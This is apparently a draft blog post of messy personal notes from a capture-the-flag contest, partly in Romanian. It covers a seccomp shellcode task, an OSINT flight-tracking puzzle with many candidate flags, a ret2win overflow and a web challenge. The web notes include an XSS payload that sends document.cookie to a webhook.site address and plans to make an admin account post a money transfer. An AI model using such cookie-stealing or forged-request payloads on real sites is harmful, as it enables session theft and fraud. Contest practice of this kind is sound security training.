+++
date = '2026-05-05'
draft = true
title = 'OSCJ 2026'
ShowToc = true
tags = ["ctf"]
+++

## Overview



       SECCOMP_SET_MODE_STRICT
              The only system calls that the calling thread is permitted
              to make are read(2), write(2), _exit(2) (but not
              exit_group(2)), and sigreturn(2).  Other system calls
              result in the termination of the calling thread, or
              termination of the entire process with the SIGKILL signal
              when there is only one thread.  Strict secure computing
              mode is useful for number-crunching applications that may
              need to execute untrusted byte code, perhaps obtained by
              reading from a pipe or socket.
              
- se citeste shellcode in buf, in heap
- apoi se executa

- trebuie sa facem asm :flagul sa nu fie niciodata deschis si voi sa trebuiasca sa il obtineti doar cu read+write
full relro

Savio, Italy, a frazione of Ravenna, which is located in Emilia-Romagna. With a total area of 850,000 square metres, it is the biggest park in Italy. It has an area of 55 hectares, with an additional waterpark area of 12 hectares, called Mirabeach.

OSC{3D4E15_DFBUZ}

OSC{4B1A23_SVA144}


4b194f	[Switzerland] 	SWR560A
OSC{4b194f_SWR560A}
OSC{4B194F_SWR560A}

4ca761	[Ireland] 	RYR4MP 
OSC{4ca761_RYR4MP}
OSC{4CA761_RYR4MP}

3d4e15	[Germany] 	DFBUZ 
OSC{3d4e15_DFBUZ}

48520b	[Netherlands] 	TRA641M 
OSC{48520b_TRA641M}
OSC{48520B_TRA641M}

738101	[Israel] 	ELY022 
OSC{738101_ELY022}

3938b7	[France] 	DSO20CP 	
OSC{3938b7_DSO20CP}
OSC{3938B7_DSO20CP}

4d208f	[Malta] 	WMT8UW 
OSC{4d208f_WMT8UW}
OSC{4D208F_WMT8UW}

4520fb	[Bulgaria] 	GPX701
OSC{4520fb_GPX701}
OSC{4520FB_GPX701}

39ceb2	[France] 	TVF61HW 
OSC{39ceb2_TVF61HW}
OSC{39CEB2_TVF61HW}

31e010	[Italy] 	IA931 
OSC{31e010_IA931}
OSC{31E010_IA931}

4cae83	[Ireland] 	TOM72Y 
OSC{4cae83_TOM72Y}
OSC{4CAE83_TOM72Y}

44ba67	[Belgium] 	AAB48N 
OSC{44ba67_AAB48N}
OSC{44BA67_AAB48N}

48520b	[Netherlands] 	TRA16N 
OSC{48520b_TRA16N}
OSC{48520B_TRA16N}

4bcde9	[Turkey] 	SXS3NN 
OSC{4bcde9_SXS3NN}
OSC{4BCDE9_SXS3NN}

78076d	[China] 	CCA939 
OSC{78076d_CCA939}
OSC{78076D_CCA939}

4ca759	[Ireland] 	ITY1359 
OSC{4ca759_ITY1359}
OSC{4CA759_ITY1359}

4d22c3	[Malta] 	RYR55BD 
OSC{4d22c3_RYR55BD}
OSC{4D22C3_RYR55BD}

3004c2	[Italy] 	NOS80MA 
OSC{3004c2_NOS80MA}
OSC{3004C2_NOS80MA}

4ca56b	[Ireland] 	RYR28QQ
OSC{4ca56b_RYR28QQ}
OSC{4CA56B_RYR28QQ}

44081e	[Austria] 	AUA536
OSC{44081e_AUA536}
OSC{44081E_AUA536}

47875a	[Norway] 	NOZ72C 
OSC{47875a_NOZ72C}
OSC{47875A_NOZ72C}

4ba919	[Turkey] 	THY4PW 
OSC{4ba919_THY4PW}
OSC{4bA919_THY4PW}

44061c	[Austria] 	EJU75GR 
OSC{44061c_EJU75GR}
OSC{44061C_EJU75GR}



47a31a	[Norway] 	NOZ58R 
OSC{47a31a_NOZ58R}
OSC{47A31A_NOZ58R}

4ca9a1	[Ireland] 	NOS7026 
OSC{4ca9a1_NOS7026}
OSC{4CA9A1_NOS7026}

bag pula iin challu asta (npte to self)
tried all from 12:00 to 19:00 bc sun hint
but it was photo timestamp

https://globe.adsbexchange.com/?replay=2025-07-20-06:48&lat=44.348&lon=12.242&zoom=12.6

https://infosecwriteups.com/invoking-mprotect-using-rop-chains-in-arm-d737bea2a9bb

ret2wi


scanf v1

win function at 0x4011E2

byte v1[32] + 8 rbp -> win

FLAG-UL REAL ESTE NUMELE PLATFORMEI MELE DE MATEMATICA, TRECUT PRIN SHA256
pe hackernews

www.tiktok.com/@mathclutch

tls.handshake.type eq 1 hich corresponds to a client hello message.
+pub-3bc1de741f8149f49bdbafa703067f24.r2.dev

allow-scripts allow-popups allow-popups-to-escape-sandbox
check diff between       <div class="code-pane"> and; <iframe  id="note-frame"

<script>
    const previewFrame = document.getElementById("note-frame");
    previewFrame.srcdoc = "\u003cscript\u003elocation=\u0027https://webhook.site/2c88c279-02ea-4353-831d-2f4a7a6e2969/?c=\u0027+encodeURIComponent(document.cookie)\u003c/script\u003e;";
</script> .... hmmm unicode escape? 


window.open('https://webhook.site/2c88c279-02ea-4353-831d-2f4a7a6e2969','h','width=600,HEIGHT=500,screenY=10,left=10,top=10,screenX=10,statusbar=0,menubar=0,resizable=0'); did something! not acces webhook tho

bruh o mers <iframe src="https://webhook.site/2c88c279-02ea-4353-831d-2f4a7a6e2969"> </iframe>

cookies are httponly :/

need to fetch /flag.txt, or FLAG env variable. NO! WE NEED TO GET THE GUY TO TRANSFER US HIS MONEY
ADMIN_PATIENT_CODE = "patient-chief"
me: patient-8f04c566e2

we need him to post /api/transfers

{"recipient":"patient-8f04c566e2","amount":2,"note":""}

1. we find a way to send this as url-encoded
2. find a way to run .js . gen r.fetch(url).post(data...)

https://disabilities-ons-dodge-lopez.trycloudflare.com/

lol 

https://eur-helping-hook-integrity.trycloudflare.com/
.NET
C
Delphi
C++

wtff 
:( nu merge

> get admn to thik its at the login and give us cred> nha

The page at 'https://dangerous-arrangement-tactics-generation.trycloudflare.com/' was loaded over HTTPS, but requested an insecure resource 'http://35.198.139.137:32671/api/transfers'. This request has been blocked; the content must be served over HTTPS.

plm... 


has been blocked by CORS policy: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.


